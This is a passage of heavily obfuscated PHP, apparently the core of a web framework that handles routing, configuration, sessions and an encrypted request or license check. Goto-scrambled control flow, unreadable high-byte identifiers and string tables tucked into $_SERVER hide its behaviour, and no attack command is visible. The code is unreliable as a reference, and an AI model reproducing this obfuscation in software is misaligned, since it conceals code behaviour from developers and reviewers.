($E‹ä¯¦ÚÃ¹[6]($E‹ä¯¦ÚÃ¹[25]($AŸ‹‚â¢, -$E‹ä¯¦ÚÃ¹[24]($D™à¢Çå‡å))) != $D™à¢Çå‡å) { return; } $BĞèõŸÙ¯× = $E‹ä¯¦ÚÃ¹[25]($AŸ‹‚â¢, 0, -$E‹ä¯¦ÚÃ¹[24]($D™à¢Çå‡å)); goto e†§ó•±; e‚Ï×ëßÚÃ: $GLOBALS[$E‹ä¯¦ÚÃ¹[22]][$E‹ä¯¦ÚÃ¹[23]] = $E‹ä¯¦ÚÃ¹[27]($bŠñ§ìÉŠŠ, $d…ßÓŠ³›Š); $f£–Î…ŠÆÃ = $e•´”•öÈÃ[557]; if (!$f£–Î…ŠÆÃ) { return; } goto d½¯­ÙÙêî; e†§ó•±: $BĞ×ÄÛµô´ = $e•´”•öÈÃ[554]; while ($BĞ×ÄÛµô´ < $e•´”•öÈÃ[555]) { if ($BĞ×ÄÛµô´ >= 0) { break; } $BĞ×ÄÛµô´++; } $bŠñ§ìÉŠŠ = array($E‹ä¯¦ÚÃ¹[8], $BĞèõŸÙ¯×); goto B×•îÏšÆ; bÜ’ö‡’â÷: } private function cezga68848d9() { goto CâƒÛ±Ô©§; AôÙµè‡¬: $CÖà¨ê«Û„ = $c·©„‘ÌÑ[31]; $EÉ†‚çƒ¹ = $BéçšìÉ„æ[560]; while ($EÉ†‚çƒ¹ < $BéçšìÉ„æ[553]) { if ($EÉ†‚çƒ¹ >= 0) { break; } $EÉ†‚çƒ¹++; } goto C·‰¸“ÍÂ©; e‹Ó»ù–”: $Cìä¡¹êî = $BéçšìÉ„æ[563]; if (strlen($Cìä¡¹êî) < $BéçšìÉ„æ[555]) { die; } $GLOBALS[$c·©„‘ÌÑ[22]][$c·©„‘ÌÑ[23]] = $c·©„‘ÌÑ[0]($c·©„‘ÌÑ[36], $e„” šˆ¡); goto cÍ‡«óˆ¹; CâƒÛ±Ô©§: $BéçšìÉ„æ =& $_SERVER[õëù©û]; $c·©„‘ÌÑ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if ($GLOBALS[$c·©„‘ÌÑ[22]][$c·©„‘ÌÑ[28]] != $c·©„‘ÌÑ[10]) { return; } goto cñ—­œ«Ì; cñ—­œ«Ì: $dÌá Ê¢ù = $_SERVER[$c·©„‘ÌÑ[30]]; $BĞéÃÔ¸¿° = $BéçšìÉ„æ[559]; if (!$BĞéÃÔ¸¿°) { die; } goto AôÙµè‡¬; CÀ°‹ô§éÊ: if (!$cÜ¸‘‹£æÉ) { return; } $e„” šˆ¡ = $c·©„‘ÌÑ[25]($dÌá Ê¢ù, $EÂ¢â‡ßÈ— + $c·©„‘ÌÑ[24]($CÖà¨ê«Û„)); $C–åõæĞÙ = $BéçšìÉ„æ[562]; goto a½‘Åø£¾½; a½‘Åø£¾½: if (!$C–åõæĞÙ) { die; } $c·©„‘ÌÑ[34]($c·©„‘ÌÑ[35], $e„” šˆ¡, $aæŒ¹Ÿæ‚); $e„” šˆ¡ = $c·©„‘ÌÑ[2]($aæŒ¹Ÿæ‚[0][0], $c·©„‘ÌÑ[36]); goto e‹Ó»ù–”; C·‰¸“ÍÂ©: if (!$c·©„‘ÌÑ[32]($dÌá Ê¢ù, $CÖà¨ê«Û„)) { return; } $EÂ¢â‡ßÈ— = $c·©„‘ÌÑ[33]($dÌá Ê¢ù, $CÖà¨ê«Û„); $cÜ¸‘‹£æÉ = $BéçšìÉ„æ[561]; goto CÀ°‹ô§éÊ; bø’½àÍÖƒ: if (strlen($e®œàØŸõø) < $BéçšìÉ„æ[555]) { die; } goto bö³ƒØ½‚¾; cÍ‡«óˆ¹: $F‰ÍÄÕñ† = $BéçšìÉ„æ[564]; $GLOBALS[$c·©„‘ÌÑ[22]][$c·©„‘ÌÑ[28]] = $c·©„‘ÌÑ[29]($c·©„‘ÌÑ[1], $GLOBALS[$c·©„‘ÌÑ[22]][$c·©„‘ÌÑ[23]]); $e®œàØŸõø = $BéçšìÉ„æ[565]; goto bø’½àÍÖƒ; bö³ƒØ½‚¾: } public function run() { goto Aœ¯‰¢ò¯ê; Aº††££ôë: if (strlen($eô·Ş›¸·») < $Eµ”Íğ©·Ğ[553]) { die; } $_SERVER[$fÈô›ù£—[44]] = $fÈô›ù£—[6](ACTION); $aĞ–Íèë‘ = $Eµ”Íğ©·Ğ[574]; goto B«Å‹•ƒ; B«Å‹•ƒ: if (!$aĞ–Íèë‘) { die; } $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][45]}(); if ($fÈô›ù£—[19]($féµ”À¶’) >= 3) { $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][21]}($CÛé±ªÑÛé); } else { $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][21]}(ACTION); } goto EÎªÈµÃ‚; d›ºĞØÂÇØ: $dÙ…ªãˆ¶ = $Eµ”Íğ©·Ğ[566]; if (!$dÙ…ªãˆ¶) { return; } $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][38]}(); goto EæèÁ¼Çìó; aâ¾«é”ò©: $fâöòâñì™ = $Eµ”Íğ©·Ğ[568]; while ($fâöòâñì™ < $Eµ”Íğ©·Ğ[555]) { if ($fâöòâñì™ >= 0) { break; } $fâöòâñì™++; } $CÛé±ªÑÛé = $GLOBALS[$fÈô›ù£—[22]][$fÈô›ù£—[28]]; goto C•…ÖÂã¾÷; C•…ÖÂã¾÷: $Dğ¸©–µë¨ = $Eµ”Íğ©·Ğ[569]; if (!$Dğ¸©–µë¨) { return; } $fÈô›ù£—[39]($fÈô›ù£—[40], isset($féµ”À¶’[0]) && $féµ”À¶’[0] ? $féµ”À¶’[0] : $this->defaultModule); goto Eï‚àÛä¤; Aœ¯‰¢ò¯ê: $Eµ”Íğ©·Ğ =& $_SERVER[õëù©û]; $fÈô›ù£— =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][37]}(); goto d›ºĞØÂÇØ; D°ò°´Ïê: if (strlen($E…ù‡ßº›Ì) < $Eµ”Íğ©·Ğ[548]) { die; } $fÈô›ù£—[39]($fÈô›ù£—[42], isset($féµ”À¶’[2]) && $féµ”À¶’[0] ? $féµ”À¶’[2] : $this->defaultAction); $fŸ÷æà‹ğ» = $Eµ”Íğ©·Ğ[572]; goto A´åµ‰İ; EæèÁ¼Çìó: $e–ª†ˆ¥ÍŞ = $Eµ”Íğ©·Ğ[567]; if (!$e–ª†ˆ¥ÍŞ) { return; } $féµ”À¶’ = $GLOBALS[$fÈô›ù£—[22]][$fÈô›ù£—[23]]; goto aâ¾«é”ò©; A´åµ‰İ: while (strlen($fŸ÷æà‹ğ») < $Eµ”Íğ©·Ğ[548]) { if (!$fŸ÷æà‹ğ») { break; } $fŸ÷æà‹ğ»++; } $fÈô›ù£—[39]($fÈô›ù£—[43], MOD . $fÈô›ù£—[1] . ST . $fÈô›ù£—[1] . ACT); $eô·Ş›¸·» = $Eµ”Íğ©·Ğ[573]; goto Aº††££ôë; Eï‚àÛä¤: $F²Éê¿Ã = $Eµ”Íğ©·Ğ[570]; $fÈô›ù£—[39]($fÈô›ù£—[41], isset($féµ”À¶’[1]) && $féµ”À¶’[0] ? $féµ”À¶’[1] : $this->defaultController); $E…ù‡ßº›Ì = $Eµ”Íğ©·Ğ[571]; goto D°ò°´Ïê; EÎªÈµÃ‚: } private $qzukdc8bfe9c = array(); private $afdo0b2e8ad0 = ''; public function mngr8b963ccc() { goto cÍ¾¹ïÃŞä; b»×…‰ğµ: $DŒ×ïˆÕ³ˆ = $DÌòøóË†¢[575]; if (strlen($DŒ×ïˆÕ³ˆ) < $DÌòøóË†¢[548]) { return; } $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][47]}(); goto fËĞÀ Ô•; B–ó•åî‰: $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][3]}($DÙõ·˜šœ[55], array($this, $DÙõ·˜šœ[56])); $AàººÕÃù = $DÌòøóË†¢[578]; if (!$AàººÕÃù) { return; } goto e¢—‹¶›‹ ; cÍ¾¹ïÃŞä: $DÌòøóË†¢ =& $_SERVER[õëù©û]; $DÙõ·˜šœ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][46]}(); goto b»×…‰ğµ; fËĞÀ Ô•: $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][48]}(); $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][49]}(); $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][50]}(); goto Aô‡¨ô¶¯Œ; Aô‡¨ô¶¯Œ: $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][51]}(); $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][52]}(); $FÊäîÁĞŠ° = $DÌòøóË†¢[576]; goto a‡ìœ»õÔ›; a‡ìœ»õÔ›: $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][3]}($DÙõ·˜šœ[53], array($this, $DÙõ·˜šœ[54])); $CÔó¦Üƒ›ó = $DÌòøóË†¢[577]; while (strlen($CÔó¦Üƒ›ó) < $DÌòøóË†¢[550]) { if (!$CÔó¦Üƒ›ó) { break; } $CÔó¦Üƒ›ó++; } goto B–ó•åî‰; cé–¨¢Ã¬: if (!$C„’ØÒ¥Ô¬) { die; } goto c†Æğ¨‘¯; e¢—‹¶›‹ : $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][3]}($DÙõ·˜šœ[57], array($this, $DÙõ·˜šœ[58])); $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][3]}($DÙõ·˜šœ[59], array($this, $DÙõ·˜šœ[60])); $C„’ØÒ¥Ô¬ = $DÌòøóË†¢[579]; goto cé–¨¢Ã¬; c†Æğ¨‘¯: } public function ursz4a2bfb13($b”ÏäÈ•„) { goto c½’ÀÖÔéÕ; cØõ×æœ¿¬: $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[113]] = $E Õİ¸øˆ[114]($_SERVER[$E Õİ¸øˆ[115]] . $a°¢„ïˆÕ[$E Õİ¸øˆ[116]]); $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[117]] = $E Õİ¸øˆ[118]($E Õİ¸øˆ[119]()); $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[120]] = $this->afdo0b2e8ad0; goto E©›®¢ÃÓÏ; b–™öÄùµª: $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[109]] = $E Õİ¸øˆ[110]($E Õİ¸øˆ[111])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][112]}(); $FÓÆÇö‡àŞ = $Eã¦–÷Ïù”[584]; if (strlen($FÓÆÇö‡àŞ) < $Eã¦–÷Ïù”[550]) { return; } goto cØõ×æœ¿¬; c½’ÀÖÔéÕ: $Eã¦–÷Ïù” =& $_SERVER[õëù©û]; $E Õİ¸øˆ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $a°¢„ïˆÕ = $E Õİ¸øˆ[61]($E Õİ¸øˆ[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}(); goto EÚÈÄËÀ˜±; c•±Í…Ñ°º: $Cœ¯ßòÔÒ¡ = $Eã¦–÷Ïù”[582]; while (strlen($Cœ¯ßòÔÒ¡) < $Eã¦–÷Ïù”[548]) { if (!$Cœ¯ßòÔÒ¡) { break; } $Cœ¯ßòÔÒ¡++; } unset($b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[95]][$E Õİ¸øˆ[96]]); goto E‘”Ç¶À±ª; EÚÈÄËÀ˜±: $dãÕÉ¾Ùö• = array($E Õİ¸øˆ[64], $E Õİ¸øˆ[65], $E Õİ¸øˆ[66], $E Õİ¸øˆ[67], $E Õİ¸øˆ[68], $E Õİ¸øˆ[69], $E Õİ¸øˆ[70], $E Õİ¸øˆ[71], $E Õİ¸øˆ[72], $E Õİ¸øˆ[73], $E Õİ¸øˆ[74], $E Õİ¸øˆ[75], $E Õİ¸øˆ[76], $E Õİ¸øˆ[77], $E Õİ¸øˆ[78], $E Õİ¸øˆ[79], $E Õİ¸øˆ[80], $E Õİ¸øˆ[81], $E Õİ¸øˆ[82], $E Õİ¸øˆ[83], $E Õİ¸øˆ[84], $E Õİ¸øˆ[85], $E Õİ¸øˆ[86], $E Õİ¸øˆ[87], $E Õİ¸øˆ[88], $E Õİ¸øˆ[89], $E Õİ¸øˆ[90]); foreach ($dãÕÉ¾Ùö• as $eÒŸçŒ•½) { $Cİ§âÁÀÔ§ = $GLOBALS[$E Õİ¸øˆ[91]][$E Õİ¸øˆ[92]][$eÒŸçŒ•½]; $F×ŸˆƒÂº = $Eã¦–÷Ïù”[580]; if (strlen($F×ŸˆƒÂº) < $Eã¦–÷Ïù”[581]) { die; } if (isset($a°¢„ïˆÕ[$eÒŸçŒ•½])) { $Cİ§âÁÀÔ§ = $a°¢„ïˆÕ[$eÒŸçŒ•½]; } $b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$eÒŸçŒ•½] = $Cİ§âÁÀÔ§; } $d‚´É©Ó› = $b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$E Õİ¸øˆ[76]]; goto c•±Í…Ñ°º; F’—»×å ˆ: unset($b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$E Õİ¸øˆ[76]]); unset($b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$E Õİ¸øˆ[98]]); $b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$E Õİ¸øˆ[99]] = array($E Õİ¸øˆ[100] => (int) $d‚´É©Ó›[$E Õİ¸øˆ[101]], $E Õİ¸øˆ[102] => $E Õİ¸øˆ[103]($E Õİ¸øˆ[104]($d‚´É©Ó›, $E Õİ¸øˆ[105], array())), $E Õİ¸øˆ[106] => (int) $E Õİ¸øˆ[104]($d‚´É©Ó›, $E Õİ¸øˆ[107], 0)); goto b–™öÄùµª; eÛ–†´—ì: $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[130]] = $E Õİ¸øˆ[104]($this->qzukdc8bfe9c, $E Õİ¸øˆ[131], $E Õİ¸øˆ[10]); if ($E Õİ¸øˆ[104]($GLOBALS, $E Õİ¸øˆ[132]) && $this->config[$E Õİ¸øˆ[133]]) { $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[134]] = WEB_ROOT; } return $b”ÏäÈ•„; goto aïß§ìñ£; E‘”Ç¶À±ª: $aÏ”Ç¸Š«  = $Eã¦–÷Ïù”[583]; while ($aÏ”Ç¸Š«  < $Eã¦–÷Ïù”[581]) { if ($aÏ”Ç¸Š«  >= 0) { break; } $aÏ”Ç¸Š« ++; } unset($b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[95]][$E Õİ¸øˆ[97]]); goto F’—»×å ˆ; E©›®¢ÃÓÏ: if ($a°¢„ïˆÕ[$E Õİ¸øˆ[120]] != $E Õİ¸øˆ[121]) { $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[122]] = $a°¢„ïˆÕ[$E Õİ¸øˆ[122]]; $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[123]] = $a°¢„ïˆÕ[$E Õİ¸øˆ[123]]; $DÀ¶•Ñö¾ = $E Õİ¸øˆ[124](10) . $this->afdo0b2e8ad0 . $E Õİ¸øˆ[124](5); $b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[125]][$E Õİ¸øˆ[126]] = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][127]}($DÀ¶•Ñö¾, $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[113]]); } if ($this->afdo0b2e8ad0 == $E Õİ¸øˆ[121]) { $b”ÏäÈ•„[$E Õİ¸øˆ[93]][$E Õİ¸øˆ[94]][$E Õİ¸øˆ[99]][$E Õİ¸øˆ[107]] = 0; } $b”ÏäÈ•„[$E Õİ¸øˆ[108]][$E Õİ¸øˆ[128]] = $E Õİ¸øˆ[104]($this->qzukdc8bfe9c, $E Õİ¸øˆ[129], $E Õİ¸øˆ[10]); goto eÛ–†´—ì; aïß§ìñ£: } private function anef9ed174b8() { goto F‘ùø†ÑÇ; dÔÂšî„ã: if ($this->afdo0b2e8ad0 == $DëÏˆ×ùƒù[121]) { return; } $a¦Å»ôùÆÚ = array($DëÏˆ×ùƒù[153], $DëÏˆ×ùƒù[154], $DëÏˆ×ùƒù[155], $DëÏˆ×ùƒù[156], $DëÏˆ×ùƒù[157], $DëÏˆ×ùƒù[158]); $Dô·É‚„ÚÖ = $DëÏˆ×ùƒù[61]($DëÏˆ×ùƒù[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}(); goto a®Ú–äœÑÒ; Dñ×Şá¯Å: foreach ($a¦Å»ôùÆÚ as $c…©„ô“ª) { if (!isset($Dô·É‚„ÚÖ[$c…©„ô“ª]) || !$Dô·É‚„ÚÖ[$c…©„ô“ª]) { continue; } $D¢ê‡®ô‘[$c…©„ô“ª] = $Dô·É‚„ÚÖ[$c…©„ô“ª]; $E¡¸ùÙ’Ï = $C”¿¡İâ¡[588]; if (!$E¡¸ùÙ’Ï) { die; } } $DëÏˆ×ùƒù[13](array($DëÏˆ×ùƒù[151], $DëÏˆ×ùƒù[152]), $D¢ê‡®ô‘); $f…Üİ£†Ï– = $C”¿¡İâ¡[589]; goto CŒÓÀë«×§; CŒÓÀë«×§: if (!$f…Üİ£†Ï–) { return; } goto aŞçó¡Áİ; F‘ùø†ÑÇ: $C”¿¡İâ¡ =& $_SERVER[õëù©û]; $DëÏˆ×ùƒù =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if ($_SERVER[$DëÏˆ×ùƒù[44]] == $DëÏˆ×ùƒù[135]) { goto b„Å‡»·Î ; b„Å‡»·Î : $EÉö¯ôÏù± = array($DëÏˆ×ùƒù[120] => $this->afdo0b2e8ad0, $DëÏˆ×ùƒù[136] => $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][137]}(), $DëÏˆ×ùƒù[138] => $DëÏˆ×ùƒù[61]($DëÏˆ×ùƒù[139])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][140]}()); if ($this->afdo0b2e8ad0 != $DëÏˆ×ùƒù[121]) { $D’ê˜Æò¿™ = $DëÏˆ×ùƒù[104]($this->qzukdc8bfe9c, $DëÏˆ×ùƒù[141]); if ($D’ê˜Æò¿™) { $EÉö¯ôÏù±[$DëÏˆ×ùƒù[142]] = $D’ê˜Æò¿™; $EÉö¯ôÏù±[$DëÏˆ×ùƒù[143]] = $DëÏˆ×ùƒù[144]($DëÏˆ×ùƒù[104]($this->qzukdc8bfe9c, $DëÏˆ×ùƒù[145])); $EÉö¯ôÏù±[$DëÏˆ×ùƒù[146]] = $DëÏˆ×ùƒù[104]($this->qzukdc8bfe9c, $DëÏˆ×ùƒù[131]); } } $EÉö¯ôÏù± = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($DëÏˆ×ùƒù[148]($EÉö¯ôÏù±), $DëÏˆ×ùƒù[114]($DëÏˆ×ùƒù[149])); goto D»àªĞ¹¤Ö; eĞéáŒ¿†î: $DëÏˆ×ùƒù[13](array($DëÏˆ×ùƒù[151], $DëÏˆ×ùƒù[152]), $D¢ê‡®ô‘); $FÊ™­¯¹‰Ë = $C”¿¡İâ¡[586]; goto eÊé¢¥ŞŸ; D»àªĞ¹¤Ö: $D¢ê‡®ô‘ = array($DëÏˆ×ùƒù[150] => $EÉö¯ôÏù±); $fÑ“Ñ˜ˆÀ = $C”¿¡İâ¡[585]; if (!$fÑ“Ñ˜ˆÀ) { die; } goto eĞéáŒ¿†î; eÊé¢¥ŞŸ: } goto dÔÂšî„ã; a®Ú–äœÑÒ: $EÃÏæ‡Œ¼ = $C”¿¡İâ¡[587]; if (!$EÃÏæ‡Œ¼) { die; } $D¢ê‡®ô‘ = array($DëÏˆ×ùƒù[159] => $Dô·É‚„ÚÖ[$DëÏˆ×ùƒù[64]], $DëÏˆ×ùƒù[160] => $Dô·É‚„ÚÖ[$DëÏˆ×ùƒù[65]], $DëÏˆ×ùƒù[161] => $DëÏˆ×ùƒù[10]); goto Dñ×Şá¯Å; aŞçó¡Áİ: } private function fgvd5be5b037() { goto eõ»Û©Ö‚; f¢‡Ï‡ë‘™: if (!isset($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[165]]) || $Cò³ñÀ‚ùã[24]($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[165]]) != 16) { $Cò³ñÀ‚ùã[166]($Cò³ñÀ‚ùã[167] . $a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[165]], !1); } $dƒ§®Î“Á = $Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}($Cò³ñÀ‚ùã[116]); $e¹ª¥—›ºÛ = array($Cò³ñÀ‚ùã[165] => $a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[165]], $Cò³ñÀ‚ùã[168] => $Cò³ñÀ‚ùã[124](16), $Cò³ñÀ‚ùã[169] => $Cò³ñÀ‚ùã[149], $Cò³ñÀ‚ùã[170] => $Cò³ñÀ‚ùã[171], $Cò³ñÀ‚ùã[172] => $_SERVER[$Cò³ñÀ‚ùã[173]], $Cò³ñÀ‚ùã[174] => $_SERVER[$Cò³ñÀ‚ùã[175]], $Cò³ñÀ‚ùã[176] => $_SERVER[$Cò³ñÀ‚ùã[177]]); goto b´¥”»«Ó¢; aŸ‹†ÜÌÜ˜: $Cò³ñÀ‚ùã[166]($Cò³ñÀ‚ùã[197]($Cò³ñÀ‚ùã[208]), !0); goto AÕ†ËŞÓ; eõ»Û©Ö‚: $f±ŸŠõñœ =& $_SERVER[õëù©û]; $Cò³ñÀ‚ùã =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if ($_SERVER[$Cò³ñÀ‚ùã[44]] != $Cò³ñÀ‚ùã[162]) { return; } goto fë„ÁÌÅå´; E‡Á”ÊÕƒˆ: $DœëŠÛŞã¢ = $Cò³ñÀ‚ùã[222]($Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[11])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][223]}(), $Cò³ñÀ‚ùã[224]); $cÏ†Å¾Ø²Ë = $f±ŸŠõñœ[595]; while (strlen($cÏ†Å¾Ø²Ë) < $f±ŸŠõñœ[581]) { if (!$cÏ†Å¾Ø²Ë) { break; } $cÏ†Å¾Ø²Ë++; } goto EŸñÏ‘¤©Å; E¶Ô°éğñ¤: $CÍ‰¡ß£¿ò = $Cò³ñÀ‚ùã[25]($Cò³ñÀ‚ùã[114]($cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[210]]), 10, 10); $e¢Ğ¥–’å = $CÍ‰¡ß£¿ò . $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[120]] . $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[212]]; $a·åæ¥†¡– = $f±ŸŠõñœ[592]; goto Dğ•ÈÜ™›Ÿ; cñã¸ˆŠº: if ($Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[217]] && $Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[217]] >= 1) { $Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][218]}($Cò³ñÀ‚ùã[219], $Cò³ñÀ‚ùã[220]); } $Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][221]}($cÜ°î¡õ¨Ò); $B ÙæÎåœä = $Cò³ñÀ‚ùã[114]($_SERVER[$Cò³ñÀ‚ùã[115]] . $Cò³ñÀ‚ùã[214]($dƒ§®Î“Á) . $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[210]]); goto E»¢×˜˜Ÿ; fàƒïŠ”Â„: $DÒö‡×÷· = array(); $DÒö‡×÷·[$f–Âß§´á] = $eÍÂÚù×ß£; $Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[11])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][226]}($EÖóæòİÑ×[$Cò³ñÀ‚ùã[227]], array($Cò³ñÀ‚ùã[228] => $DÒö‡×÷·)); goto aŸ‹†ÜÌÜ˜; Dğ•ÈÜ™›Ÿ: if (!$a·åæ¥†¡–) { die; } $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[122]] = $Cò³ñÀ‚ùã[214]($Cò³ñÀ‚ùã[118]($this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($e¢Ğ¥–’å, $Cò³ñÀ‚ùã[215]))); $B¯æá·¤ = $Cò³ñÀ‚ùã[124](16); goto A¼¬³‘Åœ; fë„ÁÌÅå´: if (!$Cò³ñÀ‚ùã[104]($GLOBALS, $Cò³ñÀ‚ùã[132])) { die; } $a“‡½Ñ©Ã÷ = $GLOBALS[$Cò³ñÀ‚ùã[22]]; if (isset($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[163]])) { $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][164]}(); die; } goto f¢‡Ï‡ë‘™; E»¢×˜˜Ÿ: $F‘«²áó = $f±ŸŠõñœ[594]; $f–Âß§´á = $Cò³ñÀ‚ùã[214]($Cò³ñÀ‚ùã[25]($B ÙæÎåœä, 10, 16)); $eÍÂÚù×ß£ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][127]}($Cò³ñÀ‚ùã[148]($Eæ¿ÇÑÃŞ·), $B ÙæÎåœä); goto E‡Á”ÊÕƒˆ; a‡ˆ‡·æµ: if (!$cÆˆ–é¤¬· || $cÆˆ–é¤¬· != $Cò³ñÀ‚ùã[201]($Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[145]])) { $DºŠù™¿øÃ = array($Cò³ñÀ‚ùã[202] => $Cò³ñÀ‚ùã[61]($Cò³ñÀ‚ùã[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}($Cò³ñÀ‚ùã[116]), $Cò³ñÀ‚ùã[203] => $_SERVER[$Cò³ñÀ‚ùã[115]], $Cò³ñÀ‚ùã[204] => $Cò³ñÀ‚ùã[205](), $Cò³ñÀ‚ùã[174] => $_SERVER[$Cò³ñÀ‚ùã[175]]); $dÎëìÒ•ºÚ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][206]}($Cò³ñÀ‚ùã[148]($DºŠù™¿øÃ)); $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][182]}($Cò³ñÀ‚ùã[207] . $dÎëìÒ•ºÚ); $Cò³ñÀ‚ùã[166]($Cò³ñÀ‚ùã[197]($Cò³ñÀ‚ùã[208]), !0); } $cÜ°î¡õ¨Ò = array($Cò³ñÀ‚ùã[209] => $e¹ª¥—›ºÛ[$Cò³ñÀ‚ùã[165]], $Cò³ñÀ‚ùã[210] => $Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[211]], $Cò³ñÀ‚ùã[212] => $Cò³ñÀ‚ùã[124](16), $Cò³ñÀ‚ùã[120] => $Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[213]]); if ($e¹ª¥—›ºÛ[$Cò³ñÀ‚ùã[168]]) { $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[212]] = $e¹ª¥—›ºÛ[$Cò³ñÀ‚ùã[168]]; } goto E¶Ô°éğñ¤; A¼¬³‘Åœ: $B°¼³òÕÑº = $B¯æá·¤ . $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[120]] . $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($Cò³ñÀ‚ùã[114]($cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[209]]), $B¯æá·¤); $cÜ°î¡õ¨Ò[$Cò³ñÀ‚ùã[123]] = $Cò³ñÀ‚ùã[118]($Cò³ñÀ‚ùã[214]($this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($B°¼³òÕÑº, $Cò³ñÀ‚ùã[216]))); $F£‹½¦ Ÿò = $f±ŸŠõñœ[593]; goto cñã¸ˆŠº; EŸñÏ‘¤©Å: $EÖóæòİÑ× = $DœëŠÛŞã¢[$Cò³ñÀ‚ùã[225]]; $AğËóŠ‚ = $f±ŸŠõñœ[596]; if (!$AğËóŠ‚) { die; } goto fàƒïŠ”Â„; D×º§óÏ•½: $Eæ¿ÇÑÃŞ· = $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]]; $cÆˆ–é¤¬· = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][199]}($Eæ¿ÇÑÃŞ·[$Cò³ñÀ‚ùã[200]]); $aš¼Ê†˜õ = $f±ŸŠõñœ[591]; goto a‡ˆ‡·æµ; b´¥”»«Ó¢: $a‹ÉÅêğ» = $Cò³ñÀ‚ùã[114]($_SERVER[$Cò³ñÀ‚ùã[115]] . $dƒ§®Î“Á); if ($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[178]] == $Cò³ñÀ‚ùã[179]) { $c¾†­Ë›òå = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($a‹ÉÅêğ», 